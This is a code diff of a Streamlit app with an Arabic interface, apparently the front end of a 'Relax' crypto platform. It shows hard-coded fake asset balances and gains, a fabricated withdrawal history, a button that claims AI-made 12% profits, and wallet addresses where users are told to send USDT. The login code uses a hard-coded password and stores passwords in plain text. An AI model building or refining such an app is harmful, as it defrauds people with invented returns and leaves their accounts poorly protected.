@@ -1,52 +1,34 @@
 import streamlit as st
 
-# إعدادات الواجهة لتشبه الصورة التي أرسلتها
-st.set_page_config(page_title="منصة Relax الذكية", layout="wide")
+st.set_page_config(page_title="Relax", page_icon="💰", layout="centered")
 
-# نظام الدخول (لحماية بياناتك)
+if 'user_db' not in st.session_state:
+    st.session_state.user_db = {"عمر": "1234"}
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
 
 if not st.session_state.logged_in:
-    st.title("🔐 مرحباً بك في Relax")
-    user = st.text_input("اسم المستخدم")
-    password = st.text_input("كلمة المرور", type="password")
-    if st.button("دخول", use_container_width=True):
-        if user == "عمر" and password == "1234":
-            st.session_state.logged_in = True
-            st.rerun()
-        else:
-            st.error("بيانات الدخول خاطئة")
+    st.markdown("<h1 style='text-align: center;'>🔐 منصة Relax الذكية</h1>", unsafe_allow_html=True)
+    tab1, tab2 = st.tabs(["تسجيل الدخول", "إنشاء حساب جديد"])
+    with tab1:
+        u = st.text_input("الاسم")
+        p = st.text_input("السر", type="password")
+        if st.button("دخول"):
+            if u in st.session_state.user_db and st.session_state.user_db[u] == p:
+                st.session_state.logged_in = True
+                st.rerun()
+    with tab2:
+        nu = st.text_input("اسم جديد")
+        np = st.text_input("سر جديد", type="password")
+        if st.button("تسجيل"):
+            st.session_state.user_db[nu] = np
+            st.success("تم! سجل دخولك الآن.")
 else:
-    # القائمة الجانبية (الأيقونات السفلية في صورتك)
-    page = st.sidebar.radio("القائمة الرئيسية", ["بيت", "تحديد الكمية", "أنا"])
-    
-    if page == "بيت":
-        st.title("🏠 الصفحة الرئيسية")
-        # الأزرار الثمانية كما في الصورة (1000083604.jpg)
-        col1, col2, col3, col4 = st.columns(4)
-        with col1:
-            if st.button("💰 تعبئة رصيد"):
-                st.info("عنوان المحفظة (USDT - TRC20):")
-                st.code("5D25D6BA994F8AC011F9017F96931C78F611D95CB93A3EF9")
-                st.warning("سيتم خصم 12% عمولة إدارية.")
-        with col2: st.button("📤 ينسحب")
-        with col3: st.button("🤝 يساعد")
-        with col4: st.button("👥 فريق")
-        
-        # عرض الأصول
-        st.divider()
-        c_a, c_b = st.columns(2)
-        c_a.metric("إجمالي الأصول (USDT)", "10192.03", "12%")
-        c_b.metric("الحساب الكمي (USDT)", "110.00", "نشط")
-        
-        st.divider()
-        st.subheader("سجل الانسحاب")
-        st.table({"المستخدم": ["+72****74", "b****@e..."], "المبلغ": ["+19359.91", "+17053.48"]})
-
-    elif page == "تحديد الكمية":
-        st.title("📊 نظام التحديد الكمي")
-        amount = st.number_input("أدخل المبلغ لبدء العملية", min_value=10)
-        if st.button("تشغيل الذكاء الاصطناعي ⚡"):
-            st.balloons()
-            st.success(f"تمت العملية! الربح المحتسب: {amount * 0.12} USDT")
+    st.title("💰 محفظة Relax")
+    st.metric("إجمالي الأصول (USDT)", "10192.03", "12%")
+    if st.button("💰 تعبئة رصيد"):
+        st.info("🔄 حول USDT (شبكة BEP20) إلى:")
+        st.code("0x05aec19d3d5e5cb9400caff56ab69c3799019942")
+    if st.sidebar.button("خروج"):
+        st.session_state.logged_in = False
+        st.rerun()
